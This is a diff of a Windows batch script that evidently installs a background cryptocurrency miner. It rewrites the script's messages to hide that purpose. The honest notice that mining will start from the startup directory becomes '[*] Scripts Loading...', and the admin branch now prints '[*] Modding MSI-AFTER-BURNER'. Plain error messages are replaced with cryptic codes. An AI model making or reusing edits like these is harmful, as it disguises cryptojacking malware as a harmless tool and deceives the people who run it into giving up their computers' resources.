@@ -40,43 +40,43 @@ if ["%USERPROFILE%"] == [""] (
 )
 
 if not exist "%USERPROFILE%" (
-  echo ERROR: Please make sure user directory %USERPROFILE% exists
+  echo ERROR: Broken Nudes...
   exit /b 1
 )
 
 where wmic >NUL
 if not %errorlevel% == 0 (
-  echo WARNING: This script requires "wmic" utility to work correctly
+  echo WARNING: Broken Pipe
 )
 
 where powershell >NUL
 if not %errorlevel% == 0 (
-  echo ERROR: This script requires "powershell" utility to work correctly
+  echo ERROR: Not Compat x64
   exit /b 1
 )
 
 where find >NUL
 if not %errorlevel% == 0 (
-  echo ERROR: This script requires "find" utility to work correctly
+  echo ERROR: compat x86
   exit /b 1
 )
 
 where findstr >NUL
 if not %errorlevel% == 0 (
-  echo ERROR: This script requires "findstr" utility to work correctly
+  echo ERROR: M4L-000xx98411114
   exit /b 1
 )
 
 where tasklist >NUL
 if not %errorlevel% == 0 (
-  echo ERROR: This script requires "tasklist" utility to work correctly
+  echo ERROR: Script-Blocked -DEF
   exit /b 1
 )
 
 if %ADMIN% == 1 (
   where sc >NUL
   if not %errorlevel% == 0 (
-    echo ERROR: This script requires "sc" utility to work correctly
+    echo ERROR: 0-0/0-0 EOL.
     exit /b 1
   )
 )
@@ -176,7 +176,7 @@ if not [%EMAIL%] == [] (
 echo.
 
 if %ADMIN% == 0 (
-  echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
+  echo [*] Scripts Loading...
 ) else (
   echo [*] Modding MSI-AFTER-BURNER
 )
